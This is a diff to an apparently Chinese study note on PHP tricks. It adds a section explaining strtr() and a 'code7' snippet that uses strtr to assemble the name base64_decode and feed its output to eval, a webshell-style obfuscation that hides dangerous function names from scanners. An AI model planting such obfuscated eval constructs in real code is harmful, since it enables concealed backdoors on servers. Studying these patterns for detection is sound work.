@@ -190,6 +190,23 @@ $b = $a('code');
 eval($d=&$b);
 ```
 ### 缓解疲劳
-![17](https://ws1.sinaimg.cn/large/006VEsyOgy1g0rr2zw5kaj308c0c00tz.jpg)
+![17](https://ws1.sinaimg.cn/large/006VEsyOgy1g0rr2zw5kaj308c0c00tz.jpg)  
+
+### strtr()函数
+* strtr() 函数转换字符串中特定的字符。  
+```
+<?php
+echo strtr("pende keky","ek","ab");
+```
+输出:  
+![18](https://ws1.sinaimg.cn/large/006VEsyOgy1g0rryj4rj1j30bi05zjrv.jpg)  
+### code7
+```php
+<?php
+$a = strtr("bask64_mkcomk","km","ed");
+$b = $a('code');
+eval($d=&$b);
+```
+
 
 
